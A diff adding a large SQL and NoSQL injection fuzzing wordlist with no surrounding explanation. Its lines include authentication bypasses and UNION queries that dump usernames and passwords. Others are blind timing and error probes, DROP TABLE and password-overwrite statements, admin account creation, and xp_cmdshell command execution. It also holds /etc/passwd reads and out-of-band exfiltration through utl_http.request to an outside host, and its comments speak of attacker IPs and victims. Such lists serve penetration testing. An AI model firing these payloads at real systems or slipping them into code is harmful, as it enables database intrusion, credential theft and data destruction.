@@ -1,0 +1,1905 @@
+ or 1=1 --
+ or 3=3 --
+!
+"
+" "
+" #
+" or "" "
+" OR "" = "
+" or ""&"
+" or ""*"
+" or ""-"
+" OR ""="
+" or ""^"
+" OR "1"="1
+" OR "1"="1"--
+" or "a"="a
+" or "x"="x
+" or 0=0 --
+" OR 1 = 1 -- -
+" or 1=1
+" OR 1=1#
+" OR 1=1--
+" or 1=1/*
+" or benchmark(10000000,MD5(1))#
+" or isNULL(1/0) /*
+" or pg_sleep(__TIME__)--
+" or sleep(__TIME__)#
+" or sleep(__TIME__)="
+" OR true--
+""
+"&"
+")
+") or ("x")=("x
+") or benchmark(10000000,MD5(1))#
+") or pg_sleep(__TIME__)--
+") or sleep(__TIME__)="
+") or true--
+"))
+")) or (("x"))=(("x
+")) or benchmark(10000000,MD5(1))#
+")) or pg_sleep(__TIME__)--
+")) or sleep(__TIME__)="
+"));waitfor delay '0:0:__TIME__'--
+");waitfor delay '0:0:__TIME__'--
+"*"
+"-"
+"--
+"/*
+";waitfor delay '0:0:__TIME__'--
+"^"
+"a"" or 1=1--"
+"a"" or 3=3--"
+"hi"") or (""a""=""a"
+#
+# <user-fieldname> <pass-fieldname> <username>
+# also try to brute force a list of possible usernames, including possile admin acct names
+# contains statements from jbrofuzz
+# from wapiti
+# fuzz interesting absolute filepath/filename into <filepath>
+# info disclosure payload fuzzfile for pgsql
+# might need to terminate payloads with ;--
+# ms-sqli info disclosure payload fuzzfile
+# mysql local file disclosure through sqli
+# regex replace as many as you can with your fuzzer for best results:
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+# you will need to customize/modify some of the vaules in the queries for best effect
+$where: '1 == 1'
+%		wildcard attribute indicator
+%' AND 8310=8310 AND '%'='
+%' AND 8310=8311 AND '%'='
+%00
+%0a*{}%0abody{background:red}%0a/
+%20$(sleep%2050)
+%20'sleep%2050'
+%20or%20''='
+%20or%20'x'='x
+%20or%201=1
+%20or%20x=x
+%20union%20/*!select*/%20/*!@@datadir*/
+%21
+%26
+%27%20or%201=1
+%27--iXhuMCk%0ALIMIT--MogMpTZGYi%0A1%2C1--TPjIJcnXAuX%0AUNION--llDCqlfYffk%0AALL--AtQHoRbN%0ASELECT--aaoghwWht%0ACONCAT%280x3a7372773a%2CIFNULL%28CAST%28database%28%29--nXGeXoOEyHm%0AAS--tWKPbn%0ACHAR%29%2C0x20%29%2C0x3a6d79643a%29%23
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%2c(select%20*%20from%20(select(sleep(10)))a)
+%31%32%33%27%20%4C%49%4D%49%54%20%31%2C%31%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%43%4F%4E%43%41%54%28%30%78%33%61%37%33%37%32%37%37%33%61%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%64%61%74%61%62%61%73%65%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%33%61%36%64%37%39%36%34%33%61%29%23
+%7C
+%C0%80%27%C0%80%C0%80%C0%80O%C0%82R%C0%80%C0%801%C0%80%C0%A11
+&
+&apos;%20OR
+'
+' #
+' %26%26 1=1--
+' && 1=1--
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+' '
+' (select top 1
+' /*!50000OR*/ 1=1--
+' /*!UNION*/ /*!SELECT*/ 1,2,3--
+' ; drop table temp --
+' and  sleep(50) and  'a'='a
+' AND 'a'='a'--
+' AND 'a'='b'--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT LENGTH(password) FROM users LIMIT 1)>5--
+' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE '%')--
+' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+' and 1=(select 1)+'
+' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--
+' and 1=1
+' and 1=1 'a'='a
+' anD 1=1"
+' AND 1=1--
+' aNd 1=2
+' AND 1=2--
+' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
+' AND 1=CAST(version() AS int)--
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND 1=CONVERT(int,@@version)--
+' AND 1=CONVERT(int,db_name())--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--
+' aNd 1=MID((database()),1,1)>1
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i
+' aNd 2=MID((@@version,1,1)--+
+' aNd 3=MID((@@version,1,1)--+
+' aNd 4=MID((@@version,1,1)--+
+' aNd 5=MID((@@version,1,1)--+
+' AND ASCII(SUBSTRING((SELECT database()),1,1))<123--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
+' AND BENCHMARK(10000000,MD5('test'))--
+' AND EXP(~(SELECT * FROM (SELECT VERSION())a))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
+' AND GTID_SUBSET(CONCAT(VERSION()),1)--
+' AND id IS NULL; --
+' AND IF(1=1,SLEEP(5),0)--
+' and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--
+' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(VERSION())) USING utf8)))--
+' AND MID(VERSION(),1,1) = '5';
+' and pg_sleep(50)--
+' AND SLEEP(5)--
+' AND SUBSTRING(version(),1,1)='5'--
+' AND SUBSTRING(version(),1,1)='8'--
+' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--
+' and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+
+' and+1=convert(int,@@version)
+' and+false%21=false--+
+' and+if(1=2,1,SLEEP(5))--+
+' and+if(true%21=true,1,SLEEP(5))--+
+' and+true=false--+
+' exec sp_addsrvrolemember 'name' , 'sysadmin' --
+' grant connect to name; grant resource to name; --
+' GROUP BY 99999
+' GROUP BY columnnames having 1=1 --
+' HAVING 1=1--
+' IF 1=1 THEN dbms_lock.sleep(50);
+' if(1%21=1,1,SLEEP(5))--+
+' if(2=2,1,SLEEP(5))--+
+' if(true=false,1,SLEEP(5))--+
+' if(true=true,1,SLEEP(5))--+
+' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
+' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+' or "
+' or '' '
+' OR '' = '
+' or ''&'
+' or ''*'
+' or ''-'
+' OR ''='
+' or ''^'
+' OR '1
+' OR '1'='1
+' OR '1'='1' #
+' OR '1'='1' %00
+' OR '1'='1' %16
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR '1'='1'--
+' OR 'sp'='sp
+' OR 'x'='x
+' or (EXISTS)
+' or 0=0 #
+' or 0=0 --
+' OR 1 -- -
+' or 1 --'
+' or 1=1
+' or 1=1 --
+' or 1=1 --'
+' OR 1=1 LIMIT 1 #
+' OR 1=1 LIMIT 1 OFFSET 0--
+' OR 1=1 LIMIT 1#
+' OR 1=1 LIMIT 1--
+' or 1=1 or ''='
+' OR 1=1#
+' OR 1=1--
+' or 1=1/*
+' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--"
+' or 3=3
+' or a=a--
+' or benchmark(10000000,MD5(1))#
+' or pg_sleep(50)--
+' or pg_sleep(__TIME__)--
+' or sleep(__TIME__)#
+' or sleep(__TIME__)='
+' OR true--
+' or uid like '%
+' or uname like '%
+' or user like '%
+' or userid like '%
+' or username like '%
+' or username LIKE '%a%",
+' or''='
+' ORDER BY 1--
+' ORDER BY 10--
+' ORDER BY 100--
+' ORDER BY 15--
+' ORDER BY 2--
+' ORDER BY 20--
+' ORDER BY 3--
+' ORDER BY 5--
+' ORDER BY 50--
+' pg_sleep(50)
+' select dbms_xmlgen.getxml('select \"a\" from sys.dual') from sys.dual;
+' SELECT IF(1=1,'true','false')
+' select+dbms_pipe.receive_message((chr(95)||chr(96)||chr(97))+from+dual)
+' SLEEP(50)
+' SLEEP(50)--
+' Un/**/IoN SeLe/**/Ct 1,2,3--
+' UNI%0bON SEL%0bECT 1,2,3--
+' uni%6fn sel%65ct 1,2,3--
+' union (select @@version) --
+' union (select NULL, (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+' UNION ALL SELECT
+' UNION SELECT
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+' UNION SELECT 1,'admin','password',1--
+' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt'--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2--
+' UNION SELECT 1--
+' UNION SELECT @@version--
+' UNION SELECT banner FROM v$version WHERE ROWNUM=1--
+' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT CONCAT(username,':',password) FROM users--
+' UNION SELECT current_database()--
+' UNION SELECT current_user--
+' UNION SELECT database()--
+' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT IF(SUBSTRING(USER(),1,4)=0x726f6f74,BENCHMARK(100000000,RAND()),1)
+' UNION SELECT IS_SRVROLEMEMBER('sysadmin')--
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' UNION SELECT name FROM master..sysdatabases--
+' UNION SELECT name FROM sqlite_master WHERE type='table'--
+' UNION SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
+' UNION SELECT name FROM sysobjects WHERE xtype='U'--
+' UNION SELECT NULL FROM dual--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL--
+' UNION SELECT schema_name FROM information_schema.schemata--
+' UNION SELECT sql FROM sqlite_master WHERE type='table'--
+' UNION SELECT sqlite_version()--
+' UNION SELECT sum(columnname ) from tablename --
+' UNION SELECT SYSTEM_USER--
+' UNION SELECT table_name FROM all_tables--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT user()--
+' UNION SELECT username FROM all_users--
+' UNION SELECT VERSION()--
+' union%23%0Aselect 1,2,3--
+' union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+
+' WAITFOR DELAY '0:0:50' and 'a'='a;--
+' WAITFOR DELAY '0:0:50';--
+' WAITFOR DELAY '0:0:50';--"
+' || 'a'=='a
+' || myappadmin.adduser('admin', 'newpass') || '
+' } ], $comment:'successful MongoDB injection'
+'!=2!=3!=4#
+'%09OR%091=1--
+'%0aOR%0a1=1--
+'%0bOR%0b1=1--
+'%0cOR%0c1=1--
+'%0dOR%0d1=1--
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+'%20AND%20SLEEP(10)='
+'%20or%20''='
+'%20or%20'x'='x
+'%20or%201=1
+'%a0OR%a01=1--
+'&'
+'&0#
+''
+'''''''''''''UNION SELECT '2
+')
+') and pg_sleep(50)--
+') and sleep(50)--
+') or '1'='1--
+') OR ('1'='1
+') OR ('1'='1'--
+') or ('1'='1--
+') or ('a'='a
+') or ('x')=('x
+') or ('x'='x
+') OR 1=1--
+') or benchmark(10000000,MD5(1))#
+') or pg_sleep(__TIME__)--
+') or sleep(__TIME__)='
+') or true--
+')%20or%20('x'='x
+'))
+')) and pg_sleep(50)--
+')) and sleep(50)--
+')) or (('x'))=(('x
+')) or benchmark(10000000,MD5(1))#
+')) or pg_sleep(50)--
+')) or pg_sleep(__TIME__)--
+')) or sleep(50)--
+')) or sleep(__TIME__)='
+'));waitfor delay '0:0:__TIME__'--
+')+waitfor+delay+'00:00:05'
+')+waitfor+delay+'0:0:5'
+')+waitfor+time+'00:00:01'
+'); exec sp_executesql('W'+'ait'+'for'+' '+'de'+'lay'+' '+'00:00:40');--
+');waitfor delay '0:0:__TIME__'--
+');waitfor delay'0:0:50';--
+');waitFor+Delay+'00:00:05'
+');waitfor+delay+'00:00:05'--
+'*'
+'+(SELECT 1 FROM (SELECT SLEEP(50))A)+'
+'+(SELECT 1)+'
+'+(SELECT 999999)+'
+'+and+(select+substr(group_concat(pass),1,1)+from+users)='a
+'+and+@@servername>1--
+'+and+@@version>1--
+'+or+1=utl_http.request('http://host/'||(select+user+from+dual))--
+'+or+round(pi(),1)+true+true = version()
+'+waitfor+delay+'00:00:05'
+'+waitfor+delay+'00:00:05'--
+'+where+(0)=0
+', $or: [ {}, { 'a':'a
+', $where: '1 == 1'
+'-'
+'--
+'/*
+'/**/OR/**/1=1--
+'1+and+'123'='123
+'1+or+'ab'='ab1
+'1+or+1=1--
+'; CREATE TABLE pwned(data TEXT)--
+'; DROP TABLE users--
+'; EXEC ('SEL' + 'ECT US' + 'ER')
+'; exec master..xp_cmdshell
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
+'; EXEC xp_cmdshell('whoami')--
+'; exec xp_regread
+'; EXECUTE IMMEDIATE  'SEL' || 'ECT US' || 'ER'
+'; IF((SELECT COUNT(*) FROM users)>0) WAITFOR DELAY '0:0:5'--
+'; IF(1=1) WAITFOR DELAY '0:0:5'--
+'; INSERT INTO users(username,password) VALUES('hacker','hacker123')--
+'; SELECT pg_sleep(5)--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; WAITFOR DELAY '0:0:5'--
+';/*&iid=1*/ EXEC/*&iid=1*/ master..xp_cmdshell /*&iid=1*/ "ping 127.0.0.1" /*&iid=1*/--
+';declare @x varchar(80); set @x = 0x73656c65637420404076657273696f6e; EXEC (@x)
+';DECLARE+@S+NVARCHAR(200);SET+@S=CAST(0x73656c65637420404076657273696f6e+AS+NVARCHAR(200));EXEC(@S);
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+';sleep(5000);
+';WAITFOR DELAY '0:0:30'--
+';waitfor delay '0:0:__TIME__'--
+';waitfor+delay+'00:00:05'
+';waitfor+delay+'0:0:5'--
+'<=>0#
+'='
+'=0--+
+'=0=1#
+'^'
+'^0#
+'a' || 'b'
+'aaa'<>'bbb'
+'aNd 1=1
+'create user name identified by 'pass123' --
+'create user name identified by pass123 temporary tablespace temp default tablespace users;
+'exec sp_addlogin 'name' , 'password' --
+'hi' or 'x'='x';
+'LIKE'
+'OR '' = '	Allows authentication without a valid username.
+'OR 1=1--
+'sqlattempt1
+'union select 1,load_file(0x2f6574632f706173737764),3 from users--
+'waitfor+delay+'00:00:05'
+'|0#
+'||1=1--
+'||UTL_HTTP.REQUEST
+'||UTL_HTTP.REQUEST('http://somehost/')||'
+'||utl_inaddr.get_host_name((select+user+from+dual))
+(
+('[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]')
+(1)rlike(if(mid(@@version,1,1)like(5),0x28,1))
+([RANDNUM]=[RANDNUM] AND SLEEP([SLEEPTIME]))
+([RANDNUM]=[RANDNUM])*[ORIGVALUE]
+([RANDNUM]=[RANDNUM])*[RANDNUM1]
+(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)
+(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)
+(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END)
+(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)
+(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE NULL END)
+(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))
+(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))
+(coalesce(length(load_file(0x2F6574632F706173737764)),1))
+(CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))
+(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')))
+(SELECT '[DELIMITER_START]'+(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)+'[DELIMITER_STOP]')
+(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')
+(SELECT '[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN TO_NUMBER(1) ELSE TO_NUMBER(0) END)||'[DELIMITER_STOP]' FROM DUAL)
+(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]')
+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))
+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)
+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))
+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))
+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)
